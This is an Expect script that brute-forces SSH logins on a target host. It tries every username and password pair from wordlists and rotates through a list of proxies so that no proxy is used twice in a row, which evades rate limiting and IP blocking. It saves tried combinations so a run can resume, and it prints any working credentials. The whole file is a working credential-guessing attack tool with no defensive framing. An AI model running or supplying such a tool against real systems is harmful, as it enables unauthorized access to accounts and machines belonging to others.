#!/usr/bin/expect

# TODO:
# Make try on empty login and password first

# Common variables
set CTRL_C "\x03"

set get_random_proxy_script_filepath "./get_random_proxy.sh"
set save_combo_to_checked_combos_script_filepath "./save_combo_to_checked_combos.sh"

set host_address [lindex $argv 0];
set usernames_filepath [lindex $argv 1];
set passwords_filepath [lindex $argv 2];
set proxies_filepath [lindex $argv 3];

set save_checked_combos_dest [lindex $argv 4];
set checked_combos_default_filename "checked_combos.txt"
set checked_combos_filepath [lindex $argv 5];
if { $checked_combos_filepath == "" } {
    set checked_combos_filepath "$save_checked_combos_dest/$checked_combos_default_filename"
} else {
    set checked_combos_filepath "$save_checked_combos_dest/$checked_combos_filepath"
}

puts "HOST ADDRESS: $host_address"
puts "USERNAMES FILEPATH: $usernames_filepath"
puts "PASSWORDS FILEPATH: $passwords_filepath"
puts "PROXIES FILEPATH: $proxies_filepath"
puts "SAVE CHECKED COMBOS TO: $checked_combos_filepath"

set usernames_file [open $usernames_filepath]
set usernames [split [read $usernames_file] "\n"]
close $usernames_file

set passwords_file [open $passwords_filepath]
set passwords [split [read $passwords_file] "\n"]
close $passwords_file


# In $usernames and $passwords last element is empty string.
# This is good because we need to check empty strings too
foreach username $usernames {
    set prev_proxy ""
    set password_found false

    foreach password $passwords {
        set combo "$username:$password"
        puts "Trying $combo"

        if { [file exists $checked_combos_filepath] } {
            set checked_combos_file [open $checked_combos_filepath]
            set checked_combos [split [read $checked_combos_file] "\n"]
            close $checked_combos_file

            set is_combo_already_checked false
            foreach checked_combo $checked_combos {
                if { $combo == $checked_combo } {
                    set is_combo_already_checked true
                    break
                }
            }

            if { $is_combo_already_checked } {
                puts "Combo already checked! Continuing..."
                continue
            }
        }

        set proxy [exec $get_random_proxy_script_filepath $proxies_filepath]
        # Don't use same proxy twice in a row
        if { $proxy == $prev_proxy } {
            while { $proxy == $prev_proxy } {
                set proxy [exec $get_random_proxy_script_filepath $proxies_filepath]
            }
        }

        set splited_proxy [split $proxy ":"]
        set proxy_host_address [lindex $splited_proxy 0]
        set proxy_port [lindex $splited_proxy 1]
        set proxy_username [lindex $splited_proxy 2]
        set proxy_password [lindex $splited_proxy 3]

        set proxy_setup "ProxyCommand=nc -X connect -x $proxy_host_address:$proxy_port -P $proxy_username %h %p"
        puts "With proxy setup: $proxy_host_address:$proxy_port:$proxy_username:$proxy_password"

        if { $username == "" } {
            spawn ssh $host_address -o $proxy_setup
        } else {
            spawn ssh $username@$host_address -o $proxy_setup
        }
        expect "password"
        send "$proxy_password\r"

        expect "password"
        send "$password\r"

        expect {
            # Successful login
            "% " {
                send "exit\r"
                puts "\n"

                puts "SUCCESSFUL!!!"
                puts "Login: $username"
                puts "Password: $password"

                set password_found true
                break
            }
            # Unsuccessful
            -nocase "password:" {
                send $CTRL_C
                exec $save_combo_to_checked_combos_script_filepath $checked_combos_filepath "$username:$password"
                puts "\n"
            }
        }

        set prev_proxy $proxy
    }

    if { $password_found } {
        break
    }
}
